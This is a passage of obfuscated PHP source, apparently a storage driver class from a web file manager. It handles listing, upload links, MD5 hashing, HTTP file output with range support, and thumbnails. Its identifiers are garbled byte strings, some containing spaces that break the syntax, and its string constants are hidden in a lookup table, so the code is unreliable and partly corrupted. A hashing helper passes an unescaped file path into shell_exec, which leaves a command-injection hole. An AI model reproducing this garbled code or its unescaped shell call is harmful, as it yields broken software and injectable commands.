$—ÛÜºî³[$Å†¬ù¦İ[33]] == $Å†¬ù¦İ[75]; $±èÄõÒâ = array($Å†¬ù¦İ[84] => $—ÛÜºî³[$Å†¬ù¦İ[84]], $Å†¬ù¦İ[75] => $†œÄ¨ Ş); if (isset($—ÛÜºî³[$Å†¬ù¦İ[76]])) { $±èÄõÒâ[$Å†¬ù¦İ[76]] = $—ÛÜºî³[$Å†¬ù¦İ[76]]; } if (isset($—ÛÜºî³[$Å†¬ù¦İ[85]])) { $±èÄõÒâ[$Å†¬ù¦İ[85]] = $—ÛÜºî³[$Å†¬ù¦İ[85]]; } if (!$†œÄ¨ Ş) { $©¸Â÷í[] = $±èÄõÒâ; continue; } $©¸Â÷í[] = $±èÄõÒâ; $ŞöŠÙğ = $—ÛÜºî³[$Å†¬ù¦İ[84]]; $“‡‰»»Î = $this->pathDriver; if (substr($—ÛÜºî³[$Å†¬ù¦İ[84]], 0, strlen($“‡‰»»Î)) == $“‡‰»»Î) { $ŞöŠÙğ = substr($ŞöŠÙğ, strlen($“‡‰»»Î)); } $this->listAllMake($ŞöŠÙğ, $©¸Â÷í); } } public function listAllSimple($¥ú™öñ, $óØ¯¡—ñ = false) { $©¬ÄôÍ˜ = $this->listAll($¥ú™öñ); return $this->listAllSimpleMake($©¬ÄôÍ˜, $this->getPathOuter($¥ú™öñ), $óØ¯¡—ñ); } public function listAllSimpleMake($è¥Ø÷”´, $àóñ¡„, $ìâ®Ôœ) { $©•¨ÃÀ =& $_SERVER[şÒÁøÒÄ]; $Ë¨µìŒˆ = array(); $àóñ¡„ = rtrim(get_path_father($àóñ¡„), $©•¨ÃÀ[8]) . $©•¨ÃÀ[8]; foreach ($è¥Ø÷”´ as $›ëÇÊ™¦) { $¤»ü«« = array($©•¨ÃÀ[84] => $›ëÇÊ™¦[$©•¨ÃÀ[84]], $©•¨ÃÀ[86] => $›ëÇÊ™¦[$©•¨ÃÀ[84]], $©•¨ÃÀ[75] => $›ëÇÊ™¦[$©•¨ÃÀ[75]]); if (isset($›ëÇÊ™¦[$©•¨ÃÀ[76]]) && !$›ëÇÊ™¦[$©•¨ÃÀ[75]]) { $¤»ü««[$©•¨ÃÀ[76]] = $›ëÇÊ™¦[$©•¨ÃÀ[76]]; } if (isset($›ëÇÊ™¦[$©•¨ÃÀ[85]])) { $¤»ü««[$©•¨ÃÀ[85]] = $›ëÇÊ™¦[$©•¨ÃÀ[85]]; } if (is_array($›ëÇÊ™¦[$©•¨ÃÀ[87]])) { $¤»ü««[$©•¨ÃÀ[86]] = $›ëÇÊ™¦[$©•¨ÃÀ[87]][$©•¨ÃÀ[84]]; $¤»ü««[$©•¨ÃÀ[76]] = $›ëÇÊ™¦[$©•¨ÃÀ[87]][$©•¨ÃÀ[76]]; $¤»ü««[$©•¨ÃÀ[85]] = $›ëÇÊ™¦[$©•¨ÃÀ[87]][$©•¨ÃÀ[85]]; } else { if (substr($›ëÇÊ™¦[$©•¨ÃÀ[84]], 0, strlen($àóñ¡„)) == $àóñ¡„) { $¤»ü««[$©•¨ÃÀ[84]] = substr($›ëÇÊ™¦[$©•¨ÃÀ[84]], strlen($àóñ¡„)); } } $ãäÕß–Û = $›ëÇÊ™¦[$©•¨ÃÀ[75]] ? $©•¨ÃÀ[8] : $©•¨ÃÀ[12]; $¤»ü««[$©•¨ÃÀ[86]] = rtrim($¤»ü««[$©•¨ÃÀ[86]], $©•¨ÃÀ[8]) . $ãäÕß–Û; $¤»ü««[$©•¨ÃÀ[84]] = $©•¨ÃÀ[8] . trim($¤»ü««[$©•¨ÃÀ[84]], $©•¨ÃÀ[8]) . $ãäÕß–Û; if (!$ìâ®Ôœ) { $Š¯°«”É = explode($©•¨ÃÀ[8], trim($¤»ü««[$©•¨ÃÀ[84]], $©•¨ÃÀ[8])); $¤»ü««[$©•¨ÃÀ[84]] = $©•¨ÃÀ[8] . implode($©•¨ÃÀ[8], array_slice($Š¯°«”É, 1)) . $ãäÕß–Û; } $Ë¨µìŒˆ[] = $¤»ü««; } return array_sort_by($Ë¨µìŒˆ, $©•¨ÃÀ[84]); } public function upload($ß”…‡Œ¡, $™†’ææ, $´Ï™“©ğ = false, $ŠßİÎ¨Š = REPEAT_REPLACE) { } public function uploadFileByID($îÑ¹„ü, $—Éú¢·Ö, $“¬€âÂò) { } public function uploadFileByPath($°ó¦¸à¡, $¹Ï¢ÈØ¬, $Ç‰“¡ = array()) { } public function isUploadServer() { $è§“»’é =& $_SERVER[şÒÁøÒÄ]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $è§“»’é[88]) { return !0; } return $GLOBALS[$è§“»’é[6]][$è§“»’é[89]][$è§“»’é[90]]; } public function isFileOutServer() { $‹û…ÂÌ =& $_SERVER[şÒÁøÒÄ]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $‹û…ÂÌ[88]) { return !0; } return $GLOBALS[$‹û…ÂÌ[6]][$‹û…ÂÌ[89]][$‹û…ÂÌ[91]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($Á‚íÇŒ) { $†Êù„¯Á =& $_SERVER[şÒÁøÒÄ]; if (!$this->isCdnHost()) { return $Á‚íÇŒ; } return str_replace(trim(get_url_root($Á‚íÇŒ), $†Êù„¯Á[8]), trim($this->cdnHost, $†Êù„¯Á[8]), $Á‚íÇŒ); } public function uploadLink($Á×”ò¨, $Õ‰ÚîÕÓ = 0) { $Şì‚¡¾‡ =& $_SERVER[şÒÁøÒÄ]; if ($this->isUploadServer()) { return; } $åï¢·Øî = $this->getType(); if (!in_array($åï¢·Øî, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $Œ×´õüÛ = 1024 * 1024 * 10; $´³ôˆ¥ = $Õ‰ÚîÕÓ <= $Œ×´õüÛ ? $Şì‚¡¾‡[92] : $Şì‚¡¾‡[93]; $äï–®ôß = (!$Õ‰ÚîÕÓ ? 1 : ceil($Õ‰ÚîÕÓ / pow(1024, 3))) * 3600 * 4; $š´ÃˆÕÙ = $this->{$´³ôˆ¥}($Á×”ò¨, $äï–®ôß); if ($š´ÃˆÕÙ) { $š´ÃˆÕÙ[$Şì‚¡¾‡[94]] = $Á×”ò¨; $š´ÃˆÕÙ[$Şì‚¡¾‡[95]] = $åï¢·Øî; } return $š´ÃˆÕÙ; } public function uploadFormData($´ã¸“ú³, $¤–ø÷É = 3600) { } public function multiUploadFormData($ª¬ËóÄ’, $½üÒøÙÑ = 3600) { } public function download($úß·§­Ø, $òš‹˜ÓŒ) { } public function ext($Ñˆ‘“¹Ø) { $³‹Òıê˜ =& $_SERVER[şÒÁøÒÄ]; if (strpos($Ñˆ‘“¹Ø, $³‹Òıê˜[8]) === -1) { $à€ˆã = $Ñˆ‘“¹Ø; } else { $à€ˆã = $this->pathThis($Ñˆ‘“¹Ø); } $÷¥¦ªé´ = $³‹Òıê˜[12]; if (strstr($à€ˆã, $³‹Òıê˜[10])) { $÷¥¦ªé´ = substr($à€ˆã, strrpos($à€ˆã, $³‹Òıê˜[10]) + 1); $÷¥¦ªé´ = strtolower($÷¥¦ªé´); } if (strlen($÷¥¦ªé´) > 3 && preg_match($³‹Òıê˜[96], $÷¥¦ªé´, $ûò£¡ªŞ)) { $÷¥¦ªé´ = $³‹Òıê˜[12]; } return $÷¥¦ªé´; } public function pathThis($ŠÔƒãö…) { $ŞÆ©áÔ =& $_SERVER[şÒÁøÒÄ]; $ŠÔƒãö… = str_replace($ŞÆ©áÔ[97], $ŞÆ©áÔ[8], rtrim($ŠÔƒãö…, $ŞÆ©áÔ[8])); $œ±İß©£ = strrpos($ŠÔƒãö…, $ŞÆ©áÔ[8]); if ($œ±İß©£ === !1) { return $ŠÔƒãö…; } return substr($ŠÔƒãö…, $œ±İß©£ + 1); } public function pathFather($¿Ö’ä…²) { $øµ¦©óù =& $_SERVER[şÒÁøÒÄ]; $¿Ö’ä…² = str_replace($øµ¦©óù[97], $øµ¦©óù[8], rtrim($¿Ö’ä…², $øµ¦©óù[8])); $Úéƒ™Ñó = strrpos($¿Ö’ä…², $øµ¦©óù[8]); if ($Úéƒ™Ñó === !1) { return $øµ¦©óù[12]; } return substr($¿Ö’ä…², 0, $Úéƒ™Ñó + 1); } public function hashSimple($µÏİå›È) { $ßÚ–Öİ =& $_SERVER[şÒÁøÒÄ]; if (!$µÏİå›È) { return md5($ßÚ–Öİ[12]); } $´¬»„Ìğ = $this->size($µÏİå›È); $äåäâ = 200; $’ğˆù¬ = 50; if ($´¬»„Ìğ <= $äåäâ * $’ğˆù¬) { return $this->hashMd5($µÏİå›È) . $´¬»„Ìğ; } $¥Ú¼ˆ·Ú = intval($´¬»„Ìğ / $’ğˆù¬); $Ë‘¢ = $ßÚ–Öİ[12]; for ($š®íî“Ğ = 0; $š®íî“Ğ < $’ğˆù¬; $š®íî“Ğ++) { $Ë‘¢ .= $this->fileSubstr($µÏİå›È, $¥Ú¼ˆ·Ú * $š®íî“Ğ, $äåäâ); } $Ë‘¢ .= $this->fileSubstr($µÏİå›È, $´¬»„Ìğ - $äåäâ, $äåäâ); return md5($Ë‘¢) . $´¬»„Ìğ; } public static $md5Cache = array(); public function hashMd5($°Í–èèÈ) { if (!$°Í–èèÈ) { return md5($_SERVER[şÒÁøÒÄ][12]); } $°Í–èèÈ = $this->iconvSystem($°Í–èèÈ); if (isset(self::$md5Cache[$°Í–èèÈ])) { return self::$md5Cache[$°Í–èèÈ]; } self::$md5Cache[$°Í–èèÈ] = $this->hashMd5Shell($°Í–èèÈ); if (!self::$md5Cache[$°Í–èèÈ]) { self::$md5Cache[$°Í–èèÈ] = @md5_file($°Í–èèÈ); } return self::$md5Cache[$°Í–èèÈ]; } private function hashMd5Shell($ÒÇ¦‹­Á) { $”ÍÅßù‚ =& $_SERVER[şÒÁøÒÄ]; if (!$ÒÇ¦‹­Á) { return md5($”ÍÅßù‚[12]); } if (!function_exists($”ÍÅßù‚[98])) { return !1; } $Ëã¡Ñ¨ğ = array($”ÍÅßù‚[99], $”ÍÅßù‚[100]); $¬öáÅƒ• = Cache::get($”ÍÅßù‚[101]); if (!$¬öáÅƒ•) { $“¯‹›Ê© = BASIC_PATH . $”ÍÅßù‚[102]; $©©¿Áì = md5_file($“¯‹›Ê©); $¬öáÅƒ• = $”ÍÅßù‚[103]; foreach ($Ëã¡Ñ¨ğ as $áîûÄ¤‚) { $ø½à–‚ú = shell_exec($áîûÄ¤‚ . "\40\42{$“¯‹›Ê©}\42"); if ($ø½à–‚ú && substr(trim($ø½à–‚ú), 0, 32) == $©©¿Áì) { $¬öáÅƒ• = $áîûÄ¤‚; break; } } Cache::set($”ÍÅßù‚[101], $¬öáÅƒ•, 3600); } if ($¬öáÅƒ• == $”ÍÅßù‚[103]) { return !1; } $ø½à–‚ú = shell_exec($¬öáÅƒ• . "\x20\x22{$ÒÇ¦‹­Á}\x22"); $ø½à–‚ú = str_replace($”ÍÅßù‚[104], $”ÍÅßù‚[12], $ø½à–‚ú); return substr($ø½à–‚ú, 0, 32); } public function link($Ö×¹öŒ•) { return $Ö×¹öŒ•; } public function fileOut($‹Ã¶úıè, $­´³• ’ = false, $Îó…ìé = false, $‰‘Æòé = '') { $ï†¤—ÒŸ =& $_SERVER[şÒÁøÒÄ]; $this->cacheMethod(null, null); if (!$‹Ã¶úıè || !$this->exist($‹Ã¶úıè)) { show_json(LNG($ï†¤—ÒŸ[105]), !1, $Îó…ìé); } $«À‘ı¨Ö = $this->getType() == $ï†¤—ÒŸ[106]; $íü´›Áâ = $GLOBALS[$ï†¤—ÒŸ[6]][$ï†¤—ÒŸ[89]][$ï†¤—ÒŸ[107]][$ï†¤—ÒŸ[108]]; $ÂÄ¢÷·Ã = (double) $GLOBALS[$ï†¤—ÒŸ[6]][$ï†¤—ÒŸ[89]][$ï†¤—ÒŸ[107]][$ï†¤—ÒŸ[109]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $Ãøô˜ş¯ = $this->infoFull($‹Ã¶úıè); $‰ˆòÈĞ© = $Ãøô˜ş¯[$ï†¤—ÒŸ[76]]; $ÖªæÜ = gmdate($ï†¤—ÒŸ[110], $Ãøô˜ş¯[$ï†¤—ÒŸ[85]]); $ë’¿ÀíØ = $Îó…ìé ? $Îó…ìé : $this->iconvApp($Ãøô˜ş¯[$ï†¤—ÒŸ[32]]); $•Ç÷•¨á = 0; $ööÔëò = $‰ˆòÈĞ© - 1; $áÕÅúˆ = $this->ext($ë’¿ÀíØ); if (in_array($áÕÅúˆ, array($ï†¤—ÒŸ[111], $ï†¤—ÒŸ[112], $ï†¤—ÒŸ[113], $ï†¤—ÒŸ[114]))) { $áÕÅúˆ = $ï†¤—ÒŸ[115]; } if (in_array($áÕÅúˆ, array($ï†¤—ÒŸ[116]))) { $áÕÅúˆ = $ï†¤—ÒŸ[117]; } if (!$‰‘Æòé) { $‰‘Æòé = md5($ÖªæÜ . $this->hashSimple($‹Ã¶úıè)); } $‰‘Æòé = $ï†¤—ÒŸ[118] . $‰‘Æòé . $ï†¤—ÒŸ[118]; $ª¥õ¥€ƒ = get_file_mime($áÕÅúˆ); $Åëü˜‹« = !0; $Åëü˜‹« = isset($_GET[$ï†¤—ÒŸ[119]]) ? !1 : !0; if ($­´³• ’ === !1 && !mime_support($ª¥õ¥€ƒ)) { $ª¥õ¥€ƒ = $ï†¤—ÒŸ[120]; } header($ï†¤—ÒŸ[121]); header($ï†¤—ÒŸ[122] . $ª¥õ¥€ƒ); $ıØµ» = rawurlencode($ë’¿ÀíØ); $ıØµ» = $ï†¤—ÒŸ[118] . $ıØµ» . $ï†¤—ÒŸ[123] . $ıØµ»; if ($­´³• ’) { header($ï†¤—ÒŸ[124]); header($ï†¤—ÒŸ[125] . $ıØµ»); } else { if ($Åëü˜‹«) { header($ï†¤—ÒŸ[126] . $ıØµ»); } } header($ï†¤—ÒŸ[127] . gmdate($ï†¤—ÒŸ[110], time() + 3600 * 24 * 30) . $ï†¤—ÒŸ[128]); header($ï†¤—ÒŸ[129]); header($ï†¤—ÒŸ[130]); header($ï†¤—ÒŸ[131]); if (isset($_SERVER[$ï†¤—ÒŸ[132]]) && strtotime($_SERVER[$ï†¤—ÒŸ[132]]) == $Ãøô˜ş¯[$ï†¤—ÒŸ[85]]) { header($ï†¤—ÒŸ[133], !0, 304); die; } if (isset($_SERVER[$ï†¤—ÒŸ[134]]) && $_SERVER[$ï†¤—ÒŸ[134]] == $‰‘Æòé) { header($ï†¤—ÒŸ[135] . $‰‘Æòé, !0, 304); die; } header($ï†¤—ÒŸ[135] . $‰‘Æòé); header($ï†¤—ÒŸ[136] . $ÖªæÜ . $ï†¤—ÒŸ[128]); header($ï†¤—ÒŸ[137] . $ë’¿ÀíØ); header($ï†¤—ÒŸ[138]); header($ï†¤—ÒŸ[139] . $‰ˆòÈĞ©); header($ï†¤—ÒŸ[140]); if (!$­´³• ’ && $áÕÅúˆ == $ï†¤—ÒŸ[141]) { if ($‰ˆòÈĞ© > 1024 * 1024 * 5) { die; } $äª”¶’ = $this->getContent($‹Ã¶úıè); $äª”¶’ = Html::clearSVG($äª”¶’); header($ï†¤—ÒŸ[142] . strlen($äª”¶’)); echo $äª”¶’; die; } $±‡Î˜€Ç = strtolower($_SERVER[$ï†¤—ÒŸ[143]]); if ($«À‘ı¨Ö && $±‡Î˜€Ç && $íü´›Áâ) { if (strstr($±‡Î˜€Ç, $ï†¤—ÒŸ[144])) { header($ï†¤—ÒŸ[145] . $‹Ã¶úıè); } else { if (strstr($±‡Î˜€Ç, $ï†¤—ÒŸ[146])) { header($ï†¤—ÒŸ[147] . $‹Ã¶úıè); } else { if (strstr($±‡Î˜€Ç, $ï†¤—ÒŸ[148])) { header($ï†¤—ÒŸ[149] . $‹Ã¶úıè); } } } if ($ÂÄ¢÷·Ã) { header($ï†¤—ÒŸ[150] . $ÂÄ¢÷·Ã); } return; } if (isset($_SERVER[$ï†¤—ÒŸ[151]])) { if (preg_match($ï†¤—ÒŸ[152], $_SERVER[$ï†¤—ÒŸ[151]], $áé¶à»)) { $•Ç÷•¨á = intval($áé¶à»[1]); $•Ç÷•¨á = $•Ç÷•¨á <= 0 ? 0 : ($•Ç÷•¨á >= $ööÔëò ? $ööÔëò : $•Ç÷•¨á); if (!empty($áé¶à»[2])) { $ïÓÖ¿¡ = intval($áé¶à»[2]); $ööÔëò = $ïÓÖ¿¡ < $•Ç÷•¨á ? $•Ç÷•¨á : ($ïÓÖ¿¡ >= $ööÔëò ? $ööÔëò : $ïÓÖ¿¡); } } header($ï†¤—ÒŸ[153]); header("\x43\x6f\x6e\x74\145\x6e\x74\55\122\141\x6e\147\145\x3a\x20\142\x79\164\x65\163\x20{$•Ç÷•¨á}\x2d{$ööÔëò}\x2f" . $‰ˆòÈĞ©); } else { header($ï†¤—ÒŸ[154]); } header($ï†¤—ÒŸ[155]); $—éšé  = !0; if ($_SERVER[$ï†¤—ÒŸ[156]] == $ï†¤—ÒŸ[157] && $‰ˆòÈĞ© > 1204 * 1024 * 1024 * 2) { $—éšé  = !1; } if ($—éšé ) { header($ï†¤—ÒŸ[158] . ($ööÔëò - $•Ç÷•¨á + 1)); } if ($_SERVER[$ï†¤—ÒŸ[159]] == $ï†¤—ÒŸ[160]) { return; } $áµ¾­Æû = 1024 * 100; $”šê¦ÚÈ = 0; if ($ÂÄ¢÷·Ã) { $”šê¦ÚÈ = intval(1000 * 1000 * ($áµ¾­Æû / $ÂÄ¢÷·Ã)); } while ($•Ç÷•¨á <= $ööÔëò) { $»ûÜïó = timeFloat(); check_abort(); $Â…¡Û¨ğ = $ööÔëò - $•Ç÷•¨á + 1; if ($Â…¡Û¨ğ <= $áµ¾­Æû) { $áµ¾­Æû = $Â…¡Û¨ğ; } echo $this->fileSubstr($‹Ã¶úıè, $•Ç÷•¨á, $áµ¾­Æû); $•Ç÷•¨á += $áµ¾­Æû; if ($áµ¾­Æû == $Â…¡Û¨ğ) { $•Ç÷•¨á = $ööÔëò + 1; } if ($”šê¦ÚÈ) { $©ËÜĞ¾† = intval(1000 * 1000 * (timeFloat() - $»ûÜïó)); $îåÉ„ = $”šê¦ÚÈ - $©ËÜĞ¾†; if ($îåÉ„ > 5) { usleep($îåÉ„); } } } } public function fileOutServer($³İáÛğ¢, $Êüé³Ç = false, $”ŠÀ´Æ® = false, $ªÜ—Şã = '') { $this->fileOut($³İáÛğ¢, $Êüé³Ç, $”ŠÀ´Æ®, $ªÜ—Şã); } public function fileOutLink($“¨ÁÉÆå) { header($_SERVER[şÒÁøÒÄ][161] . $“¨ÁÉÆå); die; } public function cacheMethod($‡Û—î“, $š—„³ÓŠ, $±ş¶Ÿ±ƒ = null) { $º¾š±áó =& $_SERVER[şÒÁøÒÄ]; static $äû­Š”ö = array(); $æöèœØ¡ = $š—„³ÓŠ ? ltrim($this->getPathOuter($š—„³ÓŠ), $º¾š±áó[8]) : $º¾š±áó[12]; $Œå€š  = $º¾š±áó[162] . $‡Û—î“ . $º¾š±áó[163] . rtrim($æöèœØ¡, $º¾š±áó[8]); if (is_null($‡Û—î“)) { $äû­Š”ö = array(); return; } if (is_null($š—„³ÓŠ)) { foreach ($äû­Š”ö as $Œå€š  => $„´ˆë¯·) { if (!strstr($Œå€š , $º¾š±áó[162] . $‡Û—î“ . $º¾š±áó[164])) { continue; } unset($äû­Š”ö[$Œå€š ]); } return; } if (!is_null($±ş¶Ÿ±ƒ)) { $äû­Š”ö[$Œå€š ] = $±ş¶Ÿ±ƒ; return; } $¼š°èˆ = isset($äû­Š”ö[$Œå€š ]) ? $äû­Š”ö[$Œå€š ] : null; if (!is_null($¼š°èˆ)) { return $¼š°èˆ; } $¼š°èˆ = $this->{$‡Û—î“}($š—„³ÓŠ); $äû­Š”ö[$Œå€š ] = $¼š°èˆ; return $¼š°èˆ; } public function cacheMethodInfoSet($Ç§ÑõŞç, $°ßÒì¸é, $Óé…Â£™ = false) { $ÁµıïÎ =& $_SERVER[şÒÁøÒÄ]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($ÁµıïÎ[165], $Ç§ÑõŞç, $°ßÒì¸é); $this->cacheMethod($ÁµıïÎ[166], $Ç§ÑõŞç, $°ßÒì¸é ? !1 : !0); if (is_array($Óé…Â£™)) { $this->cacheMethod($ÁµıïÎ[167], $Ç§ÑõŞç, $Óé…Â£™); } } public function fileOutImage($¯°áÒŒä, $Ÿ¾—€Î = 250) { $‘Â•½û÷ =& $_SERVER[şÒÁøÒÄ]; set_timeout(); if (substr($¯°áÒŒä, 0, 4) == $‘Â•½û÷[148]) { $this->fileOutLink($¯°áÒŒä); } $ÃÖ°¤†¥ = $this->info($¯°áÒŒä); $À¤­åß¶ = $ÃÖ°¤†¥[$‘Â•½û÷[32]]; $‹ÑµÆ¸› = !1; if (isset($GLOBALS[$‘Â•½û÷[168]]) && $GLOBALS[$‘Â•½û÷[168]][$‘Â•½û÷[84]] == $ÃÖ°¤†¥[$‘Â•½û÷[84]]) { $†óùìÍË = $GLOBALS[$‘Â•½û÷[168]][$‘Â•½û÷[169]]; if (!$ÃÖ°¤†¥[$‘Â•½û÷[170]]) { $ÃÖ°¤†¥[$‘Â•½û÷[170]] = $GLOBALS[$‘Â•½û÷[168]]; } if (isset($†óùìÍË[$‘Â•½û÷[171]])) { if ($†óùìÍË[$‘Â•½û÷[171]] <= $Ÿ¾—€Î && $†óùìÍË[$‘Â•½û÷[172]] <= $Ÿ¾—€Î) { $‹ÑµÆ¸› = !0; } } $À¤­åß¶ = $ÃÖ°¤†¥[$‘Â•½û÷[170]][$‘Â•½û÷[32]]; } if ($ÃÖ°¤†¥[$‘Â•½û÷[76]] <= 1024 * 50 || $‹ÑµÆ¸› || !function_exists($‘Â•½û÷[173]) || $ÃÖ°¤†¥[$‘Â•½û÷[174]] == $‘Â•½û÷[175]) { return $this->fileOut($¯°áÒŒä, !1, $À¤­åß¶); } if (isset($ÃÖ°¤†¥[$‘Â•½û÷[170]][$‘Â•½û÷[176]])) { $Ëê¼Ñ§Ò = $ÃÖ°¤†¥[$‘Â•½û÷[170]][$‘Â•½û÷[176]]; } else { if (isset($ÃÖ°¤†¥[$‘Â•½û÷[170]][$‘Â•½û÷[177]])) { $Ëê¼Ñ§Ò = $ÃÖ°¤†¥[$‘Â•½û÷[170]][$‘Â•½û÷[177]]; } } if (!$Ëê¼Ñ§Ò) { $Ëê¼Ñ§Ò = md5("{$ÃÖ°¤†¥[$‘Â•½û÷[32]]}\x5f{$ÃÖ°¤†¥[$‘Â•½û÷[84]]}\137{$ÃÖ°¤†¥[$‘Â•½û÷[76]]}\x5f{$Ÿ¾—€Î}"); } $¯‹Æ±Ù÷ = "{$Ëê¼Ñ§Ò}\x5f{$Ÿ¾—€Î}\56\160\x6e\147"; if (!($îı»’‹ô = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $‘Â•½û÷[178]))) { $Îé”¨Ìã = IO::mkdir(IO_PATH_SYSTEM_TEMP . $‘Â•½û÷[179]); } else { $Îé”¨Ìã = KodIO::make($îı»’‹ô); } if ($îı»’‹ô = IO::fileNameExist($Îé”¨Ìã, $¯‹Æ±Ù÷)) { $şó‘ßÔ = KodIO::make($îı»’‹ô); return IO::fileOut($şó‘ßÔ, !1, $À¤­åß¶); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $şó‘ßÔ = DATA_THUMB . $¯‹Æ±Ù÷; del_file($şó‘ßÔ); if (!@file_exists($şó‘ßÔ)) { $¥ËÂº« = TEMP_FILES; if (!is_dir($¥ËÂº«)) { mk_dir($¥ËÂº«); } $Ç„ƒÁĞ– = $¥ËÂº« . $Ëê¼Ñ§Ò . $‘Â•½û÷[10] . $ÃÖ°¤†¥[$‘Â•½û÷[174]]; if (!@file_exists($Ç„ƒÁĞ–)) { $Ç„ƒÁĞ– = $this->download($¯°áÒŒä, $Ç„ƒÁĞ–); } ImageThumb::createThumb($Ç„ƒÁĞ–, $şó‘ßÔ, $Ÿ¾—€Î, $Ÿ¾—€Î * 10); } if (!file_exists($şó‘ßÔ) || filesize($şó‘ßÔ) < 100) { return @file_exists($Ç„ƒÁĞ–) ? IO::fileOut($Ç„ƒÁĞ–) : $this->fileOut($¯°áÒŒä); } if (!($ä¯©ıà¯ = IO::move($şó‘ßÔ, $Îé”¨Ìã))) { return IO::fileOut($şó‘ßÔ); } del_file($şó‘ßÔ); IO::fileOut($ä¯©ıà¯); } public function fileOutImageServer($£­ü¹Ô, $ïÇ–”ã¬ = 250) { $this->fileOutImage($£­ü¹Ô, $ïÇ–”ã¬); } public function fileNameAuto($Á²ç’”Ÿ, $¾Ì¥µÈ, $ÕôÓ§şâ = REPEAT_RENAME, $ÖâÑş…µ = false) { $àâ­î® =& $_SERVER[şÒÁøÒÄ]; $”˜©â·Ø = $Á²ç’”Ÿ === $àâ­î®[12] ? $¾Ì¥µÈ : rtrim($Á²ç’”Ÿ, $àâ­î®[8]) . $àâ­î®[8] . $¾Ì¥µÈ; if ($ÕôÓ§şâ == REPEAT_REPLACE || !$this->exist($”˜©â·Ø) || $ÖâÑş…µ && $ÕôÓ§şâ != REPEAT_RENAME_FOLDER) { return $¾Ì¥µÈ; } if ($ÕôÓ§şâ == REPEAT_SKIP) { return !1; } $¬Î¾ò» = $àâ­î®[10] . get_path_ext($¾Ì¥µÈ); $¬Î¾ò» = $¬Î¾ò» == $àâ­î®[10] || $ÖâÑş…µ ? $àâ­î®[12] : $¬Î¾ò»; $’¬İÇƒÈ = 1; $Ü½ù˜öù = substr($¾Ì¥µÈ, 0, strlen($¾Ì¥µÈ) - strlen($¬Î¾ò»)); $æƒ¬´ Ú = $Ü½ù˜öù . "\x28{$’¬İÇƒÈ}\51{$¬Î¾ò»}"; while ($this->exist(rtrim($Á²ç’”Ÿ, $àâ­î®[8]) . $àâ­î®[8] . $æƒ¬´ Ú)) { $æƒ¬´ Ú = $Ü½ù˜öù . "\x28{$’¬İÇƒÈ}\x29{$¬Î¾ò»}"; $’¬İÇƒÈ++; } return $æƒ¬´ Ú; } private function fileNameAutoList($×ù­îğª, $á£Ìõê, $„¹«¦ßÜ = false) { $ä°Šë§Ñ =& $_SERVER[şÒÁøÒÄ]; $®ü¤ï—… = $this->listPath($×ù­îğª, !0); $®ü¤ï—… = array_merge($®ü¤ï—…[$ä°Šë§Ñ[82]], $®ü¤ï—…[$ä°Šë§Ñ[83]]); $…ñ¹ÆÄ– = array_to_keyvalue($®ü¤ï—…, $ä°Šë§Ñ[12], $ä°Šë§Ñ[32]); $›Ö”Ç…Ş = $ä°Šë§Ñ[10] . get_path_ext($á£Ìõê); $›Ö”Ç…Ş = $›Ö”Ç…Ş == $ä°Šë§Ñ[10] || $„¹«¦ßÜ ? $ä°Šë§Ñ[12] : $›Ö”Ç…Ş; $„”‹ù±¸ = substr($á£Ìõê, 0, strlen($á£Ìõê) - strlen($›Ö”Ç…Ş)); $œ†ÕÌÀÎ = $„”‹ù±¸ . "\x28\x30\51{$›Ö”Ç…Ş}"; for ($øóş×ê = 1; $øóş×ê <= count($…ñ¹ÆÄ–) + 1; $øóş×ê++) { $œ†ÕÌÀÎ = $„”‹ù±¸ . "\50{$øóş×ê}\51{$›Ö”Ç…Ş}"; if (!in_array_not_case($œ†ÕÌÀÎ, $…ñ¹ÆÄ–)) { return $œ†ÕÌÀÎ; } } return $œ†ÕÌÀÎ; } public function listAllFiles($¢ä±‹¡, $ñËê’³) { $´ÚÔ…¿õ =& $_SERVER[şÒÁøÒÄ]; if (empty($ñËê’³)) { return array(); } $ÍÆĞ¾ß = array_keys($ñËê’³); $Œ¢«÷³ö = array(); $¢ä±‹¡ = trim($¢ä±‹¡, $´ÚÔ…¿õ[8]); foreach ($ñËê’³ as $ëÜåÏ³Ş => $¬õ„½Í¶) { $çÍ¬ùú¾ = ltrim(substr(trim($ëÜåÏ³Ş, $´ÚÔ…¿õ[8]), strlen($¢ä±‹¡)), $´ÚÔ…¿õ[8]); if (substr($ëÜåÏ³Ş, -1) == $´ÚÔ…¿õ[8]) { $çÍ¬ùú¾ = rtrim($çÍ¬ùú¾, $´ÚÔ…¿õ[8]) . $´ÚÔ…¿õ[8]; } $Œ¢«÷³ö = array_merge($Œ¢«÷³ö, $this->slicePath($çÍ¬ùú¾)); } $Š‡èÖ»– = array(); foreach (array_unique($Œ¢«÷³ö) as $ñ±ÚÒ) { $¬›¾Ññö = array($´ÚÔ…¿õ[84] => $this->getPathOuter($´ÚÔ…¿õ[8] . $¢ä±‹¡ . $´ÚÔ…¿õ[8] . $ñ±ÚÒ), $´ÚÔ…¿õ[75] => 1, $´ÚÔ…¿õ[76] => 0); if (substr($ñ±ÚÒ, -1) != $´ÚÔ…¿õ[8]) { $¬›¾Ññö[$´ÚÔ…¿õ[75]] = 0; $ÚÁÀó° = $this->getPath($¢ä±‹¡ . $´ÚÔ…¿õ[8] . $ñ±ÚÒ); if (isset($ñËê’³[$ÚÁÀó°])) { $ÕïØÛ¼© = $ñËê’³[$ÚÁÀó°]; if (isset($ÕïØÛ¼©[$´ÚÔ…¿õ[76]])) { $¬›¾Ññö[$´ÚÔ…¿õ[76]] = intval($ÕïØÛ¼©[$´ÚÔ…¿õ[76]]); } if (isset($ÕïØÛ¼©[$´ÚÔ…¿õ[180]])) { $¬›¾Ññö[$´ÚÔ…¿õ[85]] = intval($ÕïØÛ¼©[$´ÚÔ…¿õ[180]]); } } } $Š‡èÖ»–[] = $¬›¾Ññö; } return $Š‡èÖ»–; } public function slicePath($Ôİ©ûáÜ) { $ª‡–¤´Ã =& $_SERVER[şÒÁøÒÄ]; $£ˆÚÍÛÓ = explode($ª‡–¤´Ã[8], trim($Ôİ©ûáÜ, 